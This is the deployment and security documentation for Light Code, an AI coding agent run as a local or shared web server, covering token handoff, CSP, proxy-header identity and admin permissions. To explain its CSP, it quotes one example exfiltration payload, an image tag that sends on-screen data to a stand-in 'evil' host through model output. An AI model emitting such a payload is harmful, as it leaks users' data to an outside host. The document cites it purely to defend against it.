# Running Light Code as a server

Two very different deployments share one binary. The first is supported today. The second
is designed for and partly built, but **is not finished, and the gap is not the code — it is
a privilege model.** Read the second half before planning it.

---

## 1. Local, single user

Starts a server on `127.0.0.1` and opens your browser. Same UI as the extension, same
agent, same config format.

```bash
npx @chosengeneration/light-code                          # current folder
npx @chosengeneration/light-code --workspace D:\src\repo
npx @chosengeneration/light-code --port 7100 --no-open
```

The bare name `light-code` on npm belongs to an unrelated package, hence the scope. The
installed command is still `light-code`.

From a clone instead:

```bash
pnpm install
pnpm serve --workspace D:\src\my-repo
```

### Before publishing a version

```bash
pnpm verify:npm
npm publish --access public   # from apps/host, after npm login
```

`verify:npm` runs lint, typecheck, tests and the build, then
`scripts/smoke-test-npm.mjs`: it packs the tarball, installs it into an empty directory
with plain `npm`, and runs it.

That last step is not ceremony. A workspace has every dependency hoisted and every sibling
package linked, so a bundled import or a missing `dependencies` entry stays invisible until
somebody installs it fresh — which is exactly how a VSIX that could not activate at all
once passed build, typecheck, test *and* package.

### How the session is protected

Loopback is not a security boundary. Any page you have open can issue requests to
`127.0.0.1`, and while it cannot *read* the reply cross-origin, a request that runs a shell
command has already done its damage on the way in. So:

- **Bound to literal `127.0.0.1`**, never `localhost` — the name resolves differently per
  machine and can dual-stack onto an interface that is not loopback at all.
- **Two-stage token handoff.** The launch URL carries a single-use token in the *fragment*,
  which browsers never send to a server. The page reads it, exchanges it at `/api/session`
  for a session token, and calls `history.replaceState` to strip it from the address bar.
  The handoff expires in 10 seconds and is consumed on first use, valid or not.
- **Bearer header, never a cookie.** Cookies are attached to requests automatically, which
  is the mechanism CSRF depends on.
- **`Origin` and `Host` are both checked on every request.** Origin catches CSRF. Host
  catches DNS rebinding, where the attacker's own domain resolves to 127.0.0.1 so the
  Origin check legitimately passes — the giveaway is a `Host` this server never bound.
- **Strict CSP** with `connect-src 'self'` and `img-src 'self' data:`. Model output renders
  in this page; without those, a reply containing `<img src="https://evil/?d=...">`
  exfiltrates whatever is on screen.
- **No `Access-Control-Allow-Origin`.** Nothing else may read these responses.

Verified against the running server: a forged Origin is refused with 403, a foreign Host
with 421, an absent or wrong token with 401, and a handoff token cannot be redeemed twice.

### Where things are stored

`--data-dir`, defaulting to the OS application-data directory:

```
<data>/shared.json                     administrator ids, variables for everyone  (0600)
<data>/users/<hash of principal id>/
    config.json            profiles, MCP servers, approvals   (0600)
    secrets.json           API keys, passwords                (0600)
    variables.json         this user's session variables      (0600)
    workspace-state.json   which task was open
    tasks/                 conversation history
    tool-results/          spilled tool output
    checkpoints/           shadow-git snapshots
```

**Variables are a file of their own, not a key in `config.json`.** The config schema strips keys
it does not recognise, so variables kept there would survive until the first unrelated save and
then vanish silently. Do not move them back.

Everything is already per-principal, which is the groundwork for the next section.

**Secrets are a file, not a keychain, and the UI says so.** The extension gets DPAPI or
Keychain through VS Code's `SecretStorage`. The server has no equivalent without a native
module, so it uses an owner-only file. Encrypting it would be theatre: the key would sit
beside it, readable by the same processes.

---

## 1b. Shared mode: `--server` — a usage guide

One server, many people, two URLs. Read section 2 before deciding to run it: this locks
*settings*, not *privileges*, and the difference matters.

### Set it up

**1. Put a reverse proxy in front.** IIS, nginx or anything that terminates your existing
authentication — Kerberos, NTLM, OIDC. The proxy authenticates the user and states the result in
a header.

**2. Make the proxy set the user header, and strip any inbound copy of it.** Stripping is not
optional: without it a user types their own header and becomes whoever they like.

```nginx
location / {
    proxy_set_header X-Forwarded-User        $remote_user;   # replaces, never appends
    proxy_set_header X-Forwarded-Display-Name $remote_user;
    proxy_pass http://127.0.0.1:8080;
}
```

Send the **immutable directory id** — an Entra object id, an AD SID — not a username. A username
gets reassigned to a different human when someone leaves; an object id does not.

**3. Start the server.**

```bash
light-code --server \
  --workspace /srv/repo \
  --trust-proxy 10.0.0.5 \
  --admin-id 8f3c1e22-... \
  --port 8080
```

It prints both URLs:

```
  users          http://127.0.0.1:8080/
  administrators http://127.0.0.1:8080/admin
```

**4. Restrict `/admin` at the proxy.** Light Code does not guard that path — see below.

### The flags

| Flag | What it does |
|---|---|
| `--server` | Shared mode. Settings become read-only except for administrators. |
| `--trust-proxy <ip>` | Believe the user header from this address. **Repeatable, and required** — without it every request is refused. |
| `--user-header <h>` | Which header carries the id. Default `X-Forwarded-User`. |
| `--admin-id <id>` | Seed an administrator. Repeatable. Applied on every start and merged into the stored list. |
| `--admin` | Opens `/admin` rather than `/` when launching a browser. Takes **no value** — the old `--admin <id>` form is an error pointing at `--admin-id`. |
| `--bind <address>` | Interface to listen on. Leave it at `127.0.0.1` and let the proxy be the only route in. |

### The header is not the trust boundary — the address is

Anything that can reach the port can send `X-Forwarded-User: anyone`. So the header is believed
**only** from an address you named, checked against the socket's peer, which a client cannot
choose.

That is why `--server` refuses to start without `--trust-proxy`. A deployment that refuses
everyone is a support call; one that believes everyone is a breach.

Two more properties worth knowing:

- **A repeated header is refused, not resolved.** A proxy that appends rather than replaces is
  exactly how an attacker-supplied value ends up beside the real one, and there is no safe way to
  pick between two answers to "who is this".
- **`::ffff:10.0.0.5` and `10.0.0.5` are treated as the same machine**, because that is what Node
  reports for an IPv4 client on a dual-stack listener. `::1` and `127.0.0.1` are **not**
  interchangeable — you named one of them and meant it.

### The two URLs

`/` is everyone's. `/admin` is the administrator's interface.

> **Reaching `/admin` is assumed to be restricted upstream.** Light Code does not re-derive who
> may be there. **Anyone who can reach `/admin` directly is an administrator**, so exposing the
> port without the proxy in front exposes the admin interface with it.

The administrator id list is still consulted, and it is the second condition: someone at `/admin`
who is not on the list is treated as an ordinary user. So a proxy rule that was never written
degrades to "nobody is an administrator" rather than "everybody is".

Administrators can edit the list from the **Variables** tab, so adding a colleague does not need a
restart. Removing yourself is allowed and logged — refusing it would mean the last administrator
can never be replaced — and `--admin-id` still wins at startup, which is the way back in.

### What only an administrator can change

| Administrators | Everyone |
|---|---|
| The **shared** provider set, and the default a new user inherits | **Their own provider profiles, with their own API keys** |
| Importing a whole configuration | Test connection, and exporting their own configuration |
| Network trust: CA, client certificate, verify TLS | Their own session variables |
| MCP servers and per-tool permissions | Mode (Code / Ask / Junior) |
| Enabling Python, the interpreter, the tools folder | Accent and expert colours |
| Search connections, the embedder, indexing | The per-chat expert budget |
| Schedules, including running one by hand | Chatting, editing, running commands |
| Readable folders outside the workspace | Their own task history |
| Auto-approve toggles and the always-allow lists | |
| Session variables that apply to everyone | |

### Providers, and bringing your own key

Everyone can add provider profiles of their own, with their own API keys, and pick which to use.
That reverses the original blanket rule deliberately. Freezing all of `profiles` treated a second
user as the same threat as a hostile repository — but the threat that reasoning is about is one
user repointing *another's* gateway, and a per-user profile cannot do that. Someone bringing their
own key is spending their own money against a host they chose.

An administrator can also publish profiles for **everyone**, in `shared.json`:

```json
{
  "defaultProfileId": "gateway",
  "profiles": [
    {
      "id": "gateway",
      "label": "Corporate gateway",
      "wireFormat": "openai",
      "baseUrl": "https://gateway.internal/v1",
      "model": "gpt-4o",
      "auth": { "type": "apiKey", "apiKeyRef": "profile:gateway:apiKey" }
    }
  ]
}
```

They appear in every user's list marked **provided**, with no Edit and no Delete — a user's file
never stores them, so an edit would silently vanish on the next save. **Duplicate** is offered
instead, which is how someone starts from the organisation's gateway and points the copy at their
own key.

`defaultProfileId` applies to anyone who has not chosen. It never overrides a choice, and it is
ignored if it names a profile that no longer exists — so removing one cannot leave every session
pointing at nothing.

A shared profile's API key lives in `<data>/shared-secrets.json` rather than in any one user's
directory, so it survives a user clearing their own secrets. As everywhere here that is storage,
not secrecy: every session runs as the same account and can read the file.

The rule: anything invariant 5 already treats as user-scope-only becomes admin-only, because a
second user on a shared box is the same threat as a hostile repository arriving by another door.
Anything unlisted that looks like a settings change (`save…`, `set…`, `delete…`) defaults to
**restricted** — forgetting to list something should mean "an administrator has to do it", never
"anyone may repoint the gateway".

A refused message is answered, not dropped: the UI hides these controls, so one arriving is either
a stale page or someone poking the API, and both deserve a reason.

---

## 1c. Session variables

Values handed to everything a session runs — shell commands and Python tools — as environment
variables. Set them in the **Variables** tab.

> **They are not secret.** Everything a session spawns runs as the server's own account, so
> another user can have their assistant read them. This answers *whose value applies*, not *who
> can see it*. API keys belong in **Providers**, which stores them separately and never sends
> them back to a page.

### Two scopes, and the administrator wins

- **Yours** — only your sessions see them. Stored in `<data>/users/<hash>/variables.json`.
- **Everyone's** — set by an administrator, applied to every user. Stored in `<data>/shared.json`.

Where both set the same name, **the administrator's value is used**. A variable set centrally is
set precisely because it has to be the same everywhere — an internal package index, a proxy, a
compliance flag — and a per-user value quietly winning would defeat the only reason to set one.

The one that lost is not hidden. Your row says so:

> **overridden** — An administrator set `REGISTRY` for everyone, so sessions use
> `https://pypi.internal/simple` and not yours.

Without that you would edit a value that could never apply and see no sign of it.

### Names

Letters, digits and underscore, not starting with a digit. Anything else is refused as you type
it, because a name a shell cannot set fails by starting a process with a *silently different*
environment rather than by erroring.

### Where they reach

`execute_command` and Python tools. The Python worker's environment stays an allowlist — the
reason it exists is that a provider API key must never reach model-authored code — and these are
added to it, because they are what a human deliberately declared.

An edit applies to the **next command**, not the next session; a Python tool picks one up when its
worker next starts.

---

## 2. Multi-user hosting with SSO — read this first

Identity is built. `ProxyHeaderIdentity` reads the user from your proxy's header, every store is
keyed by `Principal.id`, and section 1b is the setup guide. So the question of *who is asking* is
answered.

**That was never the hard part.** The hard part is this:

> Light Code executes shell commands, reads and writes files, and spawns MCP servers. On a
> hosted deployment, all of that runs as **the account the server process runs as** — not as
> the person who asked for it.

SSO tells you *who is asking*. It does not change *what their request can do*. So on a
shared server, with the design as it stands:

- Every user's commands run with the same OS privileges as every other user's.
- Any user can instruct the agent to read any file the service account can read —
  including another user's `secrets.json` under `<data>/users/`, since file permissions
  separate accounts, and here there is only one account.
- Any user can configure an MCP server, which is an arbitrary executable, and it runs as the
  service account.
- The approval gate protects a user from the *model*. It does not protect users from each
  other, because the person approving is the person asking.

This is consistent with what Light Code has always claimed — §3 of `CLAUDE.md` says plainly
that it does not sandbox executed code and does not protect against another process running
as the same user. On one desktop that is a reasonable line. On a shared server it means
**every user is effectively an administrator of every other user's data.**

### What would actually make it safe

In rough order of how much they buy you:

1. **One OS account per user, or one container per session.** This is the real fix and
   nothing else substitutes for it. The server becomes a supervisor that launches a
   per-user worker under that user's identity; the worker holds the bridge. On Windows this
   is a service that impersonates the authenticated principal, or a container per session.
2. **Workspace confinement per principal**, so a user's tools are rooted in their own tree
   rather than a shared one.
3. **Deny MCP configuration to ordinary users**, or restrict it to an operator-managed
   allowlist. It is arbitrary code execution by design.
4. **Disable the Claude CLI expert and `execute_command` by policy** unless 1 is done.

None of those are built. Until at least (1) is, a hosted deployment is safe only where
**every user is already trusted with everything every other user can reach** — for
instance, one small team sharing a service account they all already have.

### If you deploy it anyway

Because "one team who all trust each other" is a real situation. Section 1b is the how; this is
the shortlist of things not to skip:

- Put it behind a proxy that terminates authentication, sets the user header, and **strips any
  inbound copy of it**.
- Send the immutable directory identifier as the id, never the username or email — both get
  reassigned to a different person when someone leaves.
- Bind the server to loopback and let the proxy be the only thing that reaches it.
- **Restrict `/admin` at the proxy.** Light Code does not guard it.
- Terminate TLS at the proxy. The `Host` allowlist needs the proxy's public authority added.
- Run the service account with the least privilege that still works, and keep its home
  directory off any share.
- Tell your users plainly that their sessions are not isolated from one another.
